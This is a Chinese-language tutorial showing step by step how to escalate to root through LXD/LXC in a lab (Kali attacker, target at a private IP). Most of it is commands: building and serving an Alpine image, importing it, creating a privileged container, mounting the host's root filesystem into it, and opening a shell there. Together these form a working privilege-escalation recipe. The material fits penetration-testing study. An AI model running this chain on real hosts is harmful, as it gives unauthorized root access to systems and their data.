# lxd/lxc提权

### 漏洞介绍

lxd是一个root进程，它可以负责执行任意用户的lxd，unix套接字写入访问操作。而且在一些情况下，lxd不会调用它的用户权限进行检查和匹配

**原理**可以理解为用用户创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果

**提权复现**

环境：攻击机kali 192.168.31.131 靶机 192.168.31.134

![image-20231125152324099](http://111.229.225.13:81/i/2023/11/25/p6ww6l-2.png)

![image-20231125152414099](http://111.229.225.13:81/i/2023/11/25/p7fvx1-2.png)

在攻击机kali上操作

通过git将构建好的alpine镜像克隆到本地,并构建

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
```

然后将**自己操作系统对应架构**tar文件发送到靶机上

```bash
python -m http.server 8848
```

然后在下载的目录上使用此命令导入镜像

```bash
lxc image import ./alpine*.tar.gz --alias myimage 
```

初始化镜像,一路回车选择默认，不过会有几个显示以及存在default，让你重命名的，选择了就可以

```bash
lxd init
```

可能最后报错，但是也没关系

例如

![image-20231125171111579](http://111.229.225.13:81/i/2023/11/25/sarf0w-2.png)

运行镜像

```bash
lxc init myimage mycontainer -c security.privileged=true
```

将/root挂载到镜像中

```bash
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

与镜像交互

```bash
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

![image-20231125171236266](http://111.229.225.13:81/i/2023/11/25/sbi46m-2.png)